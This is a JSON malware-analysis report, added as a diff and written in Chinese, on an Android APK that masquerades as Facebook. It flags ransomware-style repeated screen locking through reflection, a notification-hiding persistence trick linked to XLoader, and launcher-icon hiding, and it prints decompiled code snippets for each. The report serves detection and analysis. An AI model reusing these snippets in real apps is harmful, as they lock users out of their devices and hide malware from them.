@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "b125ea78fb390950893d146a51f513440314be7648207b59e5d0a1752740f273.apk",
+    "sha256": "b125ea78fb390950893d146a51f513440314be7648207b59e5d0a1752740f273",
+    "包名": "jfgh.rtw.ghm",
+    "应用名": "Facebook",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 158.9
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "while (true) { int i2 = i; if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "malicious_code_snippet_context": "while (true) { int i2 = i; if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "behavior_description": "该代码在子线程中循环70次（每次间隔99毫秒），通过Java反射方式调用系统服务（DevicePolicyManager）的lockNow()方法，反复强制锁定设备屏幕。使用反射而非直接调用是为了规避静态检测。这种高频重复锁屏是典型的Android勒索软件行为：即使用户解锁屏幕，恶意程序也会立即再次锁屏，使用户完全无法正常使用设备，从而达到勒索目的。数据流向：通过getSystemService()获取DevicePolicyManager系统服务→通过反射invoke调用lockNow()危险API强制锁屏，循环执行以维持设备锁定状态。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\das\\hfCancelNoticeService;",
+          "method_signature": "if(Build.VERSION.SDK_INT > 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT > 18) {\n    Notification.Builder builder = new Notification.Builder(this);\n    builder.setSmallIcon(R.mipmap.icon);\n    startForeground(vgMainService.a, builder.build());\n    new Thread(new Runnable() {\n        public void run() {\n            hfCancelNoticeService.this.a();\n            ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a);\n            hfCancelNoticeService.this.stopSelf();\n        }\n    }).start();\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.app.Service\n      public int onStartCommand(Intent intent, int i, int i2) {\n>>>         if (Build.VERSION.SDK_INT > 18) {\n>>>             Notification.Builder builder = new Notification.Builder(this);\n>>>             builder.setSmallIcon(R.mipmap.icon);\n>>>             startForeground(vgMainService.a, builder.build());\n>>>             new Thread(new Runnable() { // from class: com.das.hfCancelNoticeService.1\n>>>                 @Override // java.lang.Runnable\n>>>                 public void run() {\n>>>                     try {\n>>>                         hfCancelNoticeService.this.a();\n>>>                         ((NotificationManager) hfCancelNoticeService.this.getSystemService(\"notification\")).cancel(vgMainService.a);\n>>>                         hfCancelNoticeService.this.stopSelf();\n>>>                     } catch (Exception e) {\n                          e.printStackTrace();\n                      }\n                  }",
+          "behavior_description": "这是Android恶意软件经典的'前台服务通知隐藏'保活技巧（XLoader家族典型手法）。onStartCommand中当系统版本高于Android 4.4（API 18）时，先使用与主服务vgMainService相同的通知ID调用startForeground()将服务提升为前台优先级（避免被系统内存回收杀死），随后在新线程中通过NotificationManager.cancel(vgMainService.a)取消同一ID的通知并调用stopSelf()销毁自身。由于通知ID与主服务一致，取消操作会移除主服务的前台通知，但主服务仍保留前台优先级，从而在用户完全无感知的情况下让恶意主服务（XLoader间谍/银行木马核心服务）长期隐蔽驻留后台，为C2通信、隐私窃取等恶意功能提供持久化保障。数据流向：startForeground()获取前台服务优先级(source) → NotificationManager.cancel()隐蔽移除可见通知(sink) → 恶意服务无痕保活。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\fde\\gsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gsActivity.this.getPackageName(), gsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在主 Activity 的 onCreate() 中，通过匿名 Runnable 立即执行隐藏图标操作：调用 PackageManager.setComponentEnabledSetting() 将自身启动器 Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数 2），并附带 DONT_KILL_APP 标志（参数 1），使应用图标从桌面启动器中消失，用户无法察觉和直接卸载。数据流向：getPackageName()/gsActivity.class.getName()（获取自身组件名）→ setComponentEnabledSetting(..., 2, 1)（禁用组件以隐藏图标）。结合同方法中注册的设备管理器接收器 rtAdminReceiver，该代码实现了恶意软件的隐蔽驻留与防卸载，与厂商报告确认的 XLoader 间谍/银行木马行为一致。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
